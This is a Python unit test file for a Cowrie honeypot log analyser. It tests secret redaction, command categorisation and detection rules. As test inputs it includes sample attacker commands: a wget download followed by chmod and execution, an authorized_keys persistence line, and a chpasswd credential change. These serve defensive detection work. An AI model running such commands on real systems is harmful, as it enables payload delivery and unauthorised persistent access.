"""Unit tests. Records mirror the field layout of real Cowrie output.

    cd backend && python -m pytest -q
"""
import os
import tempfile

os.environ.setdefault("VS_DATA_DIR", tempfile.mkdtemp())

from voidsentinel.categories import categorize  # noqa: E402
from voidsentinel.rules import session_findings  # noqa: E402
from voidsentinel.sanitize import sanitize  # noqa: E402
from voidsentinel.sessions import parse_ts, summarize  # noqa: E402


def ev(eventid, t, **kw):
    d = {"eventid": eventid, "session": "abc123", "src_ip": "198.51.100.7",
         "timestamp": f"2026-11-12T10:00:{t:02d}.000000Z", **kw}
    clean = sanitize(d)
    clean["_uid"], clean["_ts"] = f"u{t}-{eventid}", parse_ts(clean["timestamp"])
    return clean


def test_sanitizer_drops_secrets():
    raw = {"eventid": "cowrie.login.success", "username": "root", "password": "hunter2",
           "message": "login attempt [root/hunter2] succeeded", "ttylog": "var/lib/x",
           "uuid": "sensor-uuid", "timestamp": "2026-11-12T10:00:00Z"}
    out = sanitize(raw)
    assert "password" not in out and "message" not in out and "ttylog" not in out
    assert "hunter2" not in str(out)
    assert out["username"] == "root"


def test_command_redaction_and_truncation():
    out = sanitize({"eventid": "cowrie.command.input", "input": "echo 'root:S3cret' | chpasswd"})
    assert "S3cret" not in out["input"] and out["vs_redacted"]
    out = sanitize({"eventid": "cowrie.command.input", "input": "echo " + "QUFB" * 40 + " | base64 -d"})
    assert "<base64:" in out["input"]
    out = sanitize({"eventid": "cowrie.command.input", "input": "x" * 1000})
    assert len(out["input"]) < 320


def test_categories():
    assert "download" in categorize("cd /tmp; wget http://203.0.113.1/a")
    assert "execution" in categorize("chmod +x a && ./a")
    assert "persistence" in categorize("echo key >> ~/.ssh/authorized_keys")
    assert "recon" in categorize("uname -a")
    assert categorize("ls -la") == {"file_ops"}


def test_summary_and_rules_dropper():
    events = [
        ev("cowrie.session.connect", 0, src_port=5555),
        ev("cowrie.login.failed", 1, username="root", password="a"),
        ev("cowrie.login.success", 2, username="root", password="b"),
        ev("cowrie.command.input", 4, input="uname -a"),
        ev("cowrie.command.input", 5, input="wget http://203.0.113.9/x -O x"),
        ev("cowrie.command.input", 7, input="chmod +x x; ./x"),
        ev("cowrie.session.closed", 9, duration="9.0"),
    ]
    s = summarize(events)
    assert s["outcome"] == "interactive" and s["status"] == "closed"
    assert s["login_failed"] == 1 and s["command_count"] == 3 and s["duration"] == 9.0
    rules = {f["rule_id"] for f in session_findings(events)}
    assert {"PAYLOAD_DOWNLOAD", "DROPPER_CHAIN", "INTERACTIVE_ACCESS"} <= rules


def test_redirect_is_not_a_download():
    events = [
        ev("cowrie.login.success", 1, username="root"),
        ev("cowrie.command.input", 2, input="echo key >> ~/.ssh/authorized_keys"),
        ev("cowrie.session.file_download", 3, destfile="/root/.ssh/authorized_keys", shasum="ab"),
        ev("cowrie.session.closed", 4),
    ]
    rules = {f["rule_id"] for f in session_findings(events)}
    assert "PAYLOAD_DOWNLOAD" not in rules and "PERSISTENCE" in rules


def test_brute_force_session():
    events = [ev("cowrie.login.failed", i, username=f"u{i}") for i in range(6)]
    s = summarize(events)
    assert s["outcome"] == "auth_failed" and s["status"] == "open"
    f = [x for x in session_findings(events) if x["rule_id"] == "AUTH_BRUTE_SESSION"]
    assert f and len(f[0]["evidence"]) == 6


def test_close_duration_both_cowrie_versions():
    from voidsentinel.sessions import close_duration
    assert close_duration(sanitize({"eventid": "cowrie.session.closed", "duration": "7.5"})) == 7.5
    assert close_duration(sanitize({"eventid": "cowrie.session.closed", "duration_ms": 8190})) == 8.19


def test_import_validation():
    from voidsentinel.importer import check
    rec, reason, flags = check('{"eventid":"cowrie.login.failed","session":"a1","timestamp":"2017-05-01T10:00:00.123Z",'
                               '"src_ip":"203.0.113.5","username":"root","password":"pw","message":"login [root/pw] failed"}')
    assert reason is None and "pw" not in str(rec) and flags["password"] and flags["message"]
    assert check('{"_source":{"eventid":"cowrie.session.connect","session":"a","timestamp":1494000000}}')[1] is None
    assert check('{"eventid":"cowrie.login.failed","timestamp":"2017-05-01T10:00:00Z"}')[1] == "missing_session"
    assert check('{"eventid":"x.y","session":"a","timestamp":"2017-05-01T10:00:00Z"}')[1] == "not_cowrie_event"
    assert check('{"eventid":"cowrie.x","session":"a","timestamp":"soon"}')[1] == "bad_timestamp"
    assert check("not json")[1] == "invalid_json"
